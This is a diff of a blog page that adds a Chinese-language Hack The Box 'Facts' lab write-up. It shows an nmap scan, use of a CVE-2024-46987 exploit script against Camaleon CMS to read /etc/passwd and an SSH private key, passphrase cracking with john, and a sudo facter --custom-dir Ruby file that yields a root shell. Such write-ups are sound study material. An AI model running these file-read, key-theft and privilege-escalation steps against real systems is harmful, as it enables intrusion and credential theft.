@@ -14,8 +14,11 @@
 <meta property="og:description" content="NmapNmap扫描端口 123456789┌──(kali👻Thr2on1)-[~&#x2F;Websec&#x2F;HTB&#x2F;Facts]└─$ sudo nmap -p- --min-rate 10000 10.129.35.87 -oA nmapscans&#x2F;portsNmap scan report for facts.htb (10.129.35.87)Host is up (0.16s latency).">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-02-02T04:47:13.000Z">
-<meta property="article:modified_time" content="2026-02-14T05:05:32.037Z">
+<meta property="article:modified_time" content="2026-02-14T09:31:37.681Z">
 <meta property="article:author" content="Thr2on1">
+<meta property="article:tag" content="CVE-2024-46987">
+<meta property="article:tag" content="Sudo">
+<meta property="article:tag" content="Linux">
 <meta name="twitter:card" content="summary">
     
     
@@ -69,15 +72,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
        --><li><a href="/categories/">Category</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/Thr2on1">Projects</a></li><!--
+       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      -->
@@ -90,7 +91,7 @@
         <li><a class="icon" aria-label="Previous post" href="/2026/02/14/HTB-Pterodactyl/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2025/07/25/HTB-Outbound/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -120,7 +121,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Camaleon-CMS"><span class="toc-number">2.</span> <span class="toc-text">Camaleon CMS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROOT"><span class="toc-number">4.</span> <span class="toc-text">ROOT</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-46987"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-46987</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">4.</span> <span class="toc-text">ROOT</span></a></li></ol>
       </div>
     
   </span>
@@ -159,17 +160,59 @@
 
 
       
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE-2024-46987/" rel="tag">CVE-2024-46987</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/Sudo/" rel="tag">Sudo</a>
+    </div>
+
 
     </div>
   </header>
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap扫描端口</p>
+    <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap扫描端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.129.35.87 -oA nmapscans/ports</span><br><span class="line">Nmap scan report <span class="keyword">for</span> facts.htb (10.129.35.87)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">54321/tcp open  unknown</span><br></pre></td></tr></table></figure>
 
 <p>开放了22、80、54321端口</p>
-<h1 id="Camaleon-CMS"><a href="#Camaleon-CMS" class="headerlink" title="Camaleon CMS"></a>Camaleon CMS</h1><h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h1 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h1>
+<h2 id="CVE-2024-46987"><a href="#CVE-2024-46987" class="headerlink" title="CVE-2024-46987"></a>CVE-2024-46987</h2><p>访问web页面，根据网站的CSS&#x2F;JS路径：<code>/assets/themes/camaleon_first/</code>可知网站采用Camaleon CMS搭建。</p>
+<p>访问admin目录，可以注册登录。经过Google发现Camaleon CMS后台存在任意文件读取，在github下载脚本<a target="_blank" rel="noopener" href="https://github.com/Goultarde/CVE-2024-46987%E3%80%82">https://github.com/Goultarde/CVE-2024-46987。</a></p>
+<p>利用注册的账号进行文件读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin</span><br><span class="line">usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:102:102::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin</span><br><span class="line">pollinate:x:103:1::/var/cache/pollinate:/bin/false</span><br><span class="line">polkitd:x:991:991:User <span class="keyword">for</span> polkitd:/:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash</span><br><span class="line">william:x:1001:1001::/home/william:/bin/bash</span><br><span class="line">_laurel:x:101:988::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>存在两个可登录的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash</span><br><span class="line">william:x:1001:1001::/home/william:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>读取user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/william/user.txt</span><br><span class="line">6ef5c0d422fc224e982adbed988d1d44</span><br></pre></td></tr></table></figure>
+
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>读取ssh密钥，尝试读取id_rsa没能读到。在AI的提示下读了authorized_keys文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/trivia/.ssh/authorized_keys</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJZbWGFe1ScRexbSkkCg7IBVrlxhzJKCC433yUP75zSe</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到私钥加密类型是ed25519，可以读取id_ed25519</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/trivia/.ssh/id_ed25519     </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBponzeuN</span><br><span class="line">I0RdixIiDl7OfQAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJZbWGFe1ScRexbS</span><br><span class="line">kkCg7IBVrlxhzJKCC433yUP75zSeAAAAoA2DmipF8Ybf8uWSGxCGTIcNZxH0sznfDeLdKY</span><br><span class="line">DF7gkgE1h7qv2V4hF3Oll5ke0tct2peCZTIPJC28lJK57knHmbaXy+v30T6RWzE+xiK7U+</span><br><span class="line">d/CmZ4tQKCjLpquSinfxckgpeOPjeQSd8AQHCUqU0xV8ddtFCxJzSnrEO29izgDIOjexn0</span><br><span class="line">66JLUXKgCTwL9mfM5pZIn6ssoPZWg+9Om1Tk4=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>将其保存在本地，然后ssh连接服务器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ ssh trivia@10.129.3.9 -i id_ed25519                                                      </span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_ed25519&#x27;</span>:</span><br></pre></td></tr></table></figure>
+
+<p>这里发现私钥被加密了，使用john爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ ssh2john id_ed25519 &gt; ssh_hash     </span><br><span class="line">                                                                                                                                                                                                </span><br><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">└─$ john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 24 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">dragonballz      (id_ed25519)     </span><br><span class="line">1g 0:00:00:52 DONE (2026-02-14 00:08) 0.01920g/s 61.44p/s 61.44c/s 61.44C/s billy1..imissu</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
+
+<p>然后再次尝试登录并输入密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(trivia) gid=1000(trivia) <span class="built_in">groups</span>=1000(trivia)</span><br></pre></td></tr></table></figure>
+
+<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>查看可能的提权路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> trivia on facts:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User trivia may run the following commands on facts:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/facter</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>trivia可以执行&#x2F;usr&#x2F;bin&#x2F;facter命令，facter是Puppet用于收集系统facts的工具。</p>
+<p>其中<code>--custom-dir</code>参数用来指定自定义脚本所在的目录并加载它，以此来收集自定义的facts信息。</p>
+<p>生成恶意ruby脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec(&quot;/bin/bash&quot;)&#x27;</span> &gt; root.rb</span><br></pre></td></tr></table></figure>
+
+<p>执行facter命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">sudo</span> facter --custom-dir .</span><br><span class="line">root@facts:/home/trivia# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@facts:/home/trivia# <span class="built_in">cat</span> /root/root.txt </span><br><span class="line">bc3d9b8d771cd78fdcc1591c7219ec33</span><br><span class="line">root@facts:/home/trivia#</span><br></pre></td></tr></table></figure>
+
+
   </div>
 </article>
 
@@ -184,15 +227,13 @@
         
           <li><a href="/">Home</a></li>
         
-          <li><a href="/about/">About</a></li>
-        
           <li><a href="/archives/">Writing</a></li>
         
           <li><a href="/categories/">Category</a></li>
         
           <li><a href="/tags/">tags</a></li>
         
-          <li><a target="_blank" rel="noopener" href="https://github.com/Thr2on1">Projects</a></li>
+          <li><a href="/about/">About</a></li>
         
           <li><a href="/search/">Search</a></li>
         
@@ -202,7 +243,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Camaleon-CMS"><span class="toc-number">2.</span> <span class="toc-text">Camaleon CMS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROOT"><span class="toc-number">4.</span> <span class="toc-text">ROOT</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-46987"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-46987</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">4.</span> <span class="toc-text">ROOT</span></a></li></ol>
       </div>
     
 
@@ -250,15 +291,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
        --><li><a href="/categories/">Category</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/Thr2on1">Projects</a></li><!--
+       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      -->
